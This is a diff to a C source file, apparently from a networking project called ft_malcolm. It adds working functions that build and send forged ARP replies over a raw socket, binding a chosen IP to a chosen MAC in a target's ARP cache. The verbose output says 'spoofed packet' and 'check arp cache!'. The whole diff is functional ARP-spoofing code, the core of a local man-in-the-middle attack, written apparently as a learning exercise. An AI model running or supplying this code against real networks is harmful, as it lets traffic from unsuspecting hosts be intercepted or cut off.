@@ -1,37 +1,62 @@
 #include "ft_malcolm.h"
-/*
-void create_arp_header(t_arp_header *arp, const t_client *source, const t_client *target)
+
+static void init_spoofed_eth(t_malcolm *malcolm, struct ethhdr *eth)
 {
-	arp->hardware_type = htons(ETHERNET);
-	arp->protocol_type = htons(ETH_P_IP);
-	arp->hardware_len = MAC_LENGTH;
-	arp->protocol_len = IPV4_LENGTH;
-	arp->opcode = htons(REQUEST);
-	ft_memcpy(&arp->source, source, sizeof(t_client));
-	ft_memcpy(&arp->target, target, sizeof(t_client));
+	ft_memcpy(eth->h_dest, malcolm->target.mac, ETH_ALEN);
+	ft_memcpy(eth->h_source, malcolm->source.mac, ETH_ALEN);
+	eth->h_proto = htons(ETH_P_ARP);
 }
 
-void create_broadcast_eth_header(t_eth_header *eth_header, const uint8_t *source_mac)
+static void init_spoofed_arp(t_malcolm *malcolm, t_arphdr *arp)
 {
-	ft_memset(eth_header->destination_mac, 0xFF, MAC_LENGTH);
-	ft_memcpy(eth_header->source_mac, source_mac, MAC_LENGTH);
-	eth_header->ether_type = htons(ETH_P_ARP);
+	arp->ar_hrd = malcolm->packet.arp->ar_hrd;
+	arp->ar_pro = malcolm->packet.arp->ar_pro;
+	arp->ar_hln = malcolm->packet.arp->ar_hln;
+	arp->ar_pln = malcolm->packet.arp->ar_pln;
+	arp->ar_op = htons(ARPOP_REPLY);
+	memcpy(arp->ar_sha, malcolm->source.mac, ETH_ALEN);
+	memcpy(arp->ar_sip, malcolm->source.ip, 4);
+	memcpy(arp->ar_tha, malcolm->target.mac, ETH_ALEN);
+	memcpy(arp->ar_tip, malcolm->target.ip, 4);
 }
 
-void prepare_broadcast_packet(t_malcolm *malcolm, const t_client *source, const t_client *target)
+int send_spoofed_arp(t_malcolm *malcolm)
 {
-	create_broadcast_eth_header(&malcolm->packet.eth_header, source->mac);
-	create_arp_header(&malcolm->packet.arp_header, source, target);
-}
+	t_arp_packet spoofed_packet;
+	struct ethhdr eth;
+	t_arphdr arp;
 
-int send_arp_packet(t_malcolm *malcolm)
-{
-	if (sendto(malcolm->sockfd, &malcolm->packet, sizeof(malcolm->packet), 0,
-			   (struct sockaddr*)&malcolm->sll, sizeof(malcolm->sll)) < 0)
+	spoofed_packet.eth = &eth;
+	spoofed_packet.arp = &arp;
+
+	if (malcolm->verbose)
 	{
-		close(malcolm->sockfd);
+		printf("received an ARP request (broadcast) from target!\n");
+	}
+
+	init_spoofed_eth(malcolm, spoofed_packet.eth);
+	init_spoofed_arp(malcolm, spoofed_packet.arp);
+
+	if (malcolm->verbose)
+	{
+		printf("spoofed packet:\n");
+		print_arp_packet(spoofed_packet);
+	}
+
+	char buffer[ETH_FRAME_MIN];
+	memset(buffer, 0, ETH_FRAME_MIN);
+	memcpy(buffer, spoofed_packet.eth, sizeof(struct ethhdr));
+	memcpy(buffer + sizeof(struct ethhdr), spoofed_packet.arp, sizeof(t_arphdr));
+
+	if (sendto(malcolm->sockfd, buffer, ETH_FRAME_MIN, 0,
+			   (struct sockaddr *)&malcolm->sll, sizeof(malcolm->sll)) < 0) {
 		return (handle_error("sendto"));
 	}
+
+	if (malcolm->verbose)
+	{
+		printf("sent packet to target.\ncheck arp cache!\n");
+	}
+
 	return 0;
 }
-*/
